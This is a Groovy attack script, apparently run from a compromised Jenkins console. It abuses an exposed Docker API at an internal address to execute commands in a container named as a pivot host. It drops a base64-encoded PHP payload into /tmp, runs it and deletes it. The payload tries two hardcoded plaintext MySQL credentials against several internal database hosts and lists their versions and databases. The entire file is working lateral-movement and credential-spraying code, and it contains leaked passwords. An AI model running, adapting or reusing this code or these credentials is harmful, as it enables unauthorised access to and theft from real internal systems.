// MySQL auth matrix: all discovered MySQL hosts x known creds
dockerApi = "http://172.27.140.148:4243"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(0);
$creds = array(
    array("app_t1", "wUt22Us2CUh#+M="),
    array("apifincadob", "nNzy]Ku2Ah=u%y1I"),
);
$targets = array(
    array("172.27.141.4", 3306),
    array("172.27.141.6", 3306),
    array("172.27.141.6", 3308),
    array("172.27.141.6", 3310),
    array("172.27.141.26", 3306),
);
foreach ($targets as $t) {
    list($h,$p) = $t;
    foreach ($creds as $c) {
        list($u,$pw) = $c;
        $dsn = "mysql:host=$h;port=$p";
        try {
            $pdo = new PDO($dsn, $u, $pw, array(PDO::ATTR_TIMEOUT => 5, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
            echo "AUTH_OK|$h:$p|$u\\n";
            foreach ($pdo->query("SELECT VERSION() v, CURRENT_USER() cu, @@hostname hn, @@port pt") as $r) {
                echo "  VERSION=".$r['v']." | CURRENT_USER=".$r['cu']." | HOSTNAME=".$r['hn']." | PORT=".$r['pt']."\\n";
            }
            foreach ($pdo->query("SHOW DATABASES") as $r) { echo "  DB: ".$r[0]."\\n"; }
        } catch (Exception $e) {
            $m = $e->getMessage();
            if (strpos($m, "1045") !== false) echo "AUTH_DENIED|$h:$p|$u\\n";
            else echo "AUTH_ERR|$h:$p|$u|".substr(str_replace("\\n"," ",$m),0,120)."\\n";
        }
    }
}
echo "PHP_DONE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/q2.php && php /tmp/q2.php; rm -f /tmp/q2.php"

println "########## MySQL AUTH MATRIX from pivot02 ##########"
println execIn("5b32e909c295", cmd)
